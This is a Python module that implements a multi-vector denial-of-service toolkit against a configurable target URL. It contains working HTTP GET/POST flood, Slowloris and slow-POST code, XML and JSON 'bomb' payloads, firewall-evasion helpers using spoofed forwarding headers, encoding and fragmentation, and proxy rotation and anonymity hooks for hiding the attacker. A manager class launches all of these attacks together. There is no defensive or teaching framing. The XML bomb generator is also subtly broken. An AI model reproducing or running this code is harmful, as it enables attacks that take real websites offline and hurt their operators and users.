"""
Web Attack Module
Comprehensive web-based attack methods and techniques
"""

import asyncio
import aiohttp
import requests
import random
import time
import threading
import json
import base64
import urllib.parse
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor
import ssl
import socket
from urllib.parse import urljoin, urlparse

from core.logger import logger
from security.privacy import PrivacyManager


@dataclass
class WebAttackConfig:
    """Configuration for web attacks"""
    # Basic Attack Settings
    target_url: str = ""
    attack_duration: int = 60  # seconds
    thread_count: int = 100
    requests_per_second: int = 1000
    
    # HTTP Settings
    timeout: int = 10
    follow_redirects: bool = False
    verify_ssl: bool = False
    use_http2: bool = True
    
    # Request Customization
    custom_headers: Dict[str, str] = field(default_factory=dict)
    custom_user_agents: List[str] = field(default_factory=lambda: [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ])
    
    # Attack Types
    enable_slowloris: bool = True
    enable_slow_post: bool = True
    enable_http_flood: bool = True
    enable_get_flood: bool = True
    enable_post_flood: bool = True
    enable_xml_bomb: bool = True
    enable_json_bomb: bool = True
    
    # Advanced Features
    use_random_payloads: bool = True
    bypass_rate_limiting: bool = True
    use_cache_busting: bool = True
    randomize_request_order: bool = True
    
    # WAF Bypass
    enable_waf_bypass: bool = True
    use_encoding_bypass: bool = True
    use_fragmentation: bool = True
    use_case_variation: bool = True
    
    # Proxy Settings
    use_proxy_rotation: bool = True
    proxy_list: List[str] = field(default_factory=list)
    
    # Privacy Integration
    use_privacy_features: bool = True


class HTTPFloodAttack:
    """HTTP Flood attack implementation"""
    
    def __init__(self, config: WebAttackConfig):
        self.config = config
        self.session = None
        self.is_attacking = False
        
    async def start_attack(self):
        """Start HTTP flood attack"""
        logger.info(f"Starting HTTP flood attack on {self.config.target_url}")
        
        self.is_attacking = True
        
        # Create aiohttp session
        connector = aiohttp.TCPConnector(
            limit=self.config.thread_count,
            ssl=False if not self.config.verify_ssl else None
        )
        
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        ) as session:
            self.session = session
            
            # Create attack tasks
            tasks = []
            for _ in range(self.config.thread_count):
                task = asyncio.create_task(self._attack_worker())
                tasks.append(task)
            
            # Wait for attack duration
            await asyncio.sleep(self.config.attack_duration)
            
            # Stop attack
            self.is_attacking = False
            
            # Wait for tasks to complete
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _attack_worker(self):
        """Individual attack worker"""
        request_count = 0
        
        while self.is_attacking:
            try:
                # Prepare request
                headers = self._generate_headers()
                url = self._generate_url()
                
                # Send request
                if self.config.enable_get_flood:
                    await self._send_get_request(url, headers)
                elif self.config.enable_post_flood:
                    await self._send_post_request(url, headers)
                
                request_count += 1
                
                # Rate limiting
                if self.config.requests_per_second > 0:
                    delay = 1.0 / self.config.requests_per_second
                    await asyncio.sleep(delay)
                
            except Exception as e:
                logger.debug(f"Request failed: {e}")
                continue
        
        logger.debug(f"Worker completed {request_count} requests")
    
    async def _send_get_request(self, url: str, headers: Dict[str, str]):
        """Send GET request"""
        async with self.session.get(url, headers=headers) as response:
            await response.read()
    
    async def _send_post_request(self, url: str, headers: Dict[str, str]):
        """Send POST request"""
        data = self._generate_post_data()
        async with self.session.post(url, headers=headers, data=data) as response:
            await response.read()
    
    def _generate_headers(self) -> Dict[str, str]:
        """Generate randomized headers"""
        headers = {
            'User-Agent': random.choice(self.config.custom_user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Add custom headers
        headers.update(self.config.custom_headers)
        
        # WAF bypass headers
        if self.config.enable_waf_bypass:
            headers.update(self._generate_waf_bypass_headers())
        
        return headers
    
    def _generate_waf_bypass_headers(self) -> Dict[str, str]:
        """Generate WAF bypass headers"""
        bypass_headers = {}
        
        # X-Forwarded headers
        fake_ips = ['127.0.0.1', '10.0.0.1', '192.168.1.1']
        bypass_headers['X-Forwarded-For'] = random.choice(fake_ips)
        bypass_headers['X-Real-IP'] = random.choice(fake_ips)
        bypass_headers['X-Originating-IP'] = random.choice(fake_ips)
        
        # Other bypass headers
        bypass_headers['X-Remote-IP'] = random.choice(fake_ips)
        bypass_headers['X-Remote-Addr'] = random.choice(fake_ips)
        bypass_headers['X-Client-IP'] = random.choice(fake_ips)
        
        return bypass_headers
    
    def _generate_url(self) -> str:
        """Generate target URL with cache busting"""
        url = self.config.target_url
        
        if self.config.use_cache_busting:
            # Add random parameters to bypass caching
            params = {
                'cb': str(random.randint(100000, 999999)),
                't': str(int(time.time())),
                'r': str(random.random())
            }
            
            separator = '&' if '?' in url else '?'
            query_string = '&'.join([f"{k}={v}" for k, v in params.items()])
            url = f"{url}{separator}{query_string}"
        
        return url
    
    def _generate_post_data(self) -> str:
        """Generate POST data"""
        if self.config.use_random_payloads:
            # Generate random form data
            data = {}
            for i in range(random.randint(5, 15)):
                key = f"field_{i}"
                value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10, 100)))
                data[key] = value
            
            return urllib.parse.urlencode(data)
        
        return "data=test"


class SlowlorisAttack:
    """Slowloris attack implementation"""
    
    def __init__(self, config: WebAttackConfig):
        self.config = config
        self.sockets = []
        self.is_attacking = False
        
    def start_attack(self):
        """Start Slowloris attack"""
        logger.info(f"Starting Slowloris attack on {self.config.target_url}")
        
        self.is_attacking = True
        
        # Parse target URL
        parsed_url = urlparse(self.config.target_url)
        host = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        # Create initial connections
        for _ in range(self.config.thread_count):
            try:
                sock = self._create_socket(host, port)
                if sock:
                    self.sockets.append(sock)
            except:
                continue
        
        logger.info(f"Created {len(self.sockets)} connections")
        
        # Keep connections alive
        while self.is_attacking:
            self._maintain_connections(host, port)
            time.sleep(10)  # Send keep-alive every 10 seconds
    
    def _create_socket(self, host: str, port: int) -> Optional[socket.socket]:
        """Create and initialize socket connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            # Connect to target
            sock.connect((host, port))
            
            # Send partial HTTP request
            request = f"GET /{random.randint(1000, 9999)} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "User-Agent: Mozilla/5.0 (compatible; Slowloris)\r\n"
            request += "Accept-language: en-US,en,q=0.5\r\n"
            
            sock.send(request.encode())
            
            return sock
            
        except Exception as e:
            logger.debug(f"Failed to create socket: {e}")
            return None
    
    def _maintain_connections(self, host: str, port: int):
        """Maintain existing connections and create new ones"""
        # Send keep-alive headers to existing connections
        for sock in self.sockets[:]:
            try:
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except:
                # Connection lost, remove from list
                self.sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
        
        # Create new connections to replace lost ones
        while len(self.sockets) < self.config.thread_count:
            sock = self._create_socket(host, port)
            if sock:
                self.sockets.append(sock)
            else:
                break
        
        logger.debug(f"Maintaining {len(self.sockets)} connections")
    
    def stop_attack(self):
        """Stop Slowloris attack"""
        self.is_attacking = False
        
        # Close all sockets
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        
        self.sockets.clear()
        logger.info("Slowloris attack stopped")


class SlowPostAttack:
    """Slow POST attack implementation"""
    
    def __init__(self, config: WebAttackConfig):
        self.config = config
        self.connections = []
        self.is_attacking = False
        
    def start_attack(self):
        """Start Slow POST attack"""
        logger.info(f"Starting Slow POST attack on {self.config.target_url}")
        
        self.is_attacking = True
        
        # Create worker threads
        threads = []
        for _ in range(self.config.thread_count):
            thread = threading.Thread(target=self._attack_worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for attack duration
        time.sleep(self.config.attack_duration)
        
        # Stop attack
        self.is_attacking = False
        
        # Wait for threads to complete
        for thread in threads:
            thread.join(timeout=5)
    
    def _attack_worker(self):
        """Individual attack worker for Slow POST"""
        while self.is_attacking:
            try:
                # Create connection
                session = requests.Session()
                
                # Prepare POST data
                large_data = 'A' * (1024 * 1024)  # 1MB of data
                
                # Send data slowly
                response = session.post(
                    self.config.target_url,
                    data=large_data,
                    headers=self._generate_slow_headers(),
                    timeout=self.config.timeout,
                    stream=True
                )
                
                # Keep connection open
                time.sleep(random.uniform(1, 5))
                
            except Exception as e:
                logger.debug(f"Slow POST request failed: {e}")
                time.sleep(1)
    
    def _generate_slow_headers(self) -> Dict[str, str]:
        """Generate headers for Slow POST"""
        return {
            'User-Agent': random.choice(self.config.custom_user_agents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': str(1024 * 1024),  # Large content length
            'Connection': 'keep-alive'
        }


class XMLBombAttack:
    """XML Bomb attack implementation"""
    
    def __init__(self, config: WebAttackConfig):
        self.config = config
        
    def generate_xml_bomb(self, depth: int = 10) -> str:
        """Generate XML bomb payload"""
        # Billion laughs attack
        xml_bomb = '<?xml version="1.0"?>\n'
        xml_bomb += '<!DOCTYPE lolz [\n'
        
        # Create nested entities
        for i in range(depth):
            if i == 0:
                xml_bomb += f'  <!ENTITY lol{i} "lol">\n'
            else:
                entities = '&lol' + str(i-1) + ';' * 10
                xml_bomb += f'  <!ENTITY lol{i} "{entities}">\n'
        
        xml_bomb += ']>\n'
        xml_bomb += f'<lolz>&lol{depth-1};</lolz>'
        
        return xml_bomb
    
    def send_xml_bomb(self):
        """Send XML bomb to target"""
        xml_payload = self.generate_xml_bomb()
        
        headers = {
            'Content-Type': 'application/xml',
            'User-Agent': random.choice(self.config.custom_user_agents)
        }
        
        try:
            response = requests.post(
                self.config.target_url,
                data=xml_payload,
                headers=headers,
                timeout=self.config.timeout
            )
            logger.debug(f"XML bomb sent, response: {response.status_code}")
        except Exception as e:
            logger.debug(f"XML bomb failed: {e}")


class JSONBombAttack:
    """JSON Bomb attack implementation"""
    
    def __init__(self, config: WebAttackConfig):
        self.config = config
        
    def generate_json_bomb(self, depth: int = 20) -> str:
        """Generate JSON bomb payload"""
        # Create deeply nested JSON
        json_data = {}
        current = json_data
        
        for i in range(depth):
            current['data'] = {}
            current['array'] = ['x'] * 1000  # Large array
            current = current['data']
        
        return json.dumps(json_data)
    
    def send_json_bomb(self):
        """Send JSON bomb to target"""
        json_payload = self.generate_json_bomb()
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': random.choice(self.config.custom_user_agents)
        }
        
        try:
            response = requests.post(
                self.config.target_url,
                data=json_payload,
                headers=headers,
                timeout=self.config.timeout
            )
            logger.debug(f"JSON bomb sent, response: {response.status_code}")
        except Exception as e:
            logger.debug(f"JSON bomb failed: {e}")


class WAFBypassManager:
    """WAF (Web Application Firewall) bypass techniques"""
    
    def __init__(self, config: WebAttackConfig):
        self.config = config
        
    def apply_encoding_bypass(self, payload: str) -> List[str]:
        """Apply various encoding techniques to bypass WAF"""
        bypassed_payloads = []
        
        # URL encoding
        bypassed_payloads.append(urllib.parse.quote(payload))
        
        # Double URL encoding
        bypassed_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # HTML encoding
        html_encoded = ''.join([f'&#{ord(c)};' for c in payload])
        bypassed_payloads.append(html_encoded)
        
        # Base64 encoding
        b64_encoded = base64.b64encode(payload.encode()).decode()
        bypassed_payloads.append(b64_encoded)
        
        # Case variation
        case_varied = ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in payload])
        bypassed_payloads.append(case_varied)
        
        return bypassed_payloads
    
    def apply_fragmentation(self, payload: str) -> str:
        """Fragment payload to bypass WAF"""
        # Insert comments and whitespace
        fragmented = ""
        for i, char in enumerate(payload):
            fragmented += char
            if i % 5 == 0 and i > 0:
                fragmented += random.choice([' ', '\t', '\n', '/**/'])
        
        return fragmented
    
    def generate_bypass_headers(self) -> Dict[str, str]:
        """Generate headers to bypass WAF"""
        return {
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'
        }


class WebAttackManager:
    """Main web attack manager"""
    
    def __init__(self, config: WebAttackConfig = None):
        self.config = config or WebAttackConfig()
        self.privacy_manager = None
        
        # Initialize attack modules
        self.http_flood = HTTPFloodAttack(self.config)
        self.slowloris = SlowlorisAttack(self.config)
        self.slow_post = SlowPostAttack(self.config)
        self.xml_bomb = XMLBombAttack(self.config)
        self.json_bomb = JSONBombAttack(self.config)
        self.waf_bypass = WAFBypassManager(self.config)
        
        # Initialize privacy features
        if self.config.use_privacy_features:
            from security.privacy import PrivacyConfig
            privacy_config = PrivacyConfig()
            self.privacy_manager = PrivacyManager(privacy_config)
    
    def start_comprehensive_attack(self):
        """Start comprehensive web attack"""
        logger.info("Starting comprehensive web attack...")
        
        # Enable privacy features
        if self.privacy_manager:
            self.privacy_manager.enable_full_privacy()
        
        # Start different attack types in parallel
        attack_threads = []
        
        if self.config.enable_http_flood:
            thread = threading.Thread(target=self._run_http_flood)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        if self.config.enable_slowloris:
            thread = threading.Thread(target=self.slowloris.start_attack)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        if self.config.enable_slow_post:
            thread = threading.Thread(target=self.slow_post.start_attack)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        if self.config.enable_xml_bomb:
            thread = threading.Thread(target=self._run_xml_bomb_attack)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        if self.config.enable_json_bomb:
            thread = threading.Thread(target=self._run_json_bomb_attack)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        # Wait for attacks to complete
        for thread in attack_threads:
            thread.join()
        
        # Disable privacy features
        if self.privacy_manager:
            self.privacy_manager.disable_privacy()
        
        logger.info("Comprehensive web attack completed")
    
    def _run_http_flood(self):
        """Run HTTP flood attack"""
        asyncio.run(self.http_flood.start_attack())
    
    def _run_xml_bomb_attack(self):
        """Run XML bomb attack"""
        for _ in range(10):  # Send 10 XML bombs
            self.xml_bomb.send_xml_bomb()
            time.sleep(1)
    
    def _run_json_bomb_attack(self):
        """Run JSON bomb attack"""
        for _ in range(10):  # Send 10 JSON bombs
            self.json_bomb.send_json_bomb()
            time.sleep(1)
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        logger.info("Stopping all web attacks...")
        
        # Stop individual attacks
        self.http_flood.is_attacking = False
        self.slowloris.stop_attack()
        self.slow_post.is_attacking = False
        
        logger.info("All web attacks stopped")
    
    def test_waf_bypass(self, test_payload: str) -> List[str]:
        """Test WAF bypass techniques"""
        logger.info("Testing WAF bypass techniques...")
        
        bypassed_payloads = self.waf_bypass.apply_encoding_bypass(test_payload)
        fragmented_payload = self.waf_bypass.apply_fragmentation(test_payload)
        bypassed_payloads.append(fragmented_payload)
        
        return bypassed_payloads
    
    def get_attack_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        return {
            'http_flood_active': self.http_flood.is_attacking,
            'slowloris_active': self.slowloris.is_attacking,
            'slow_post_active': self.slow_post.is_attacking,
            'slowloris_connections': len(self.slowloris.sockets),
            'target_url': self.config.target_url,
            'privacy_enabled': self.privacy_manager is not None
        }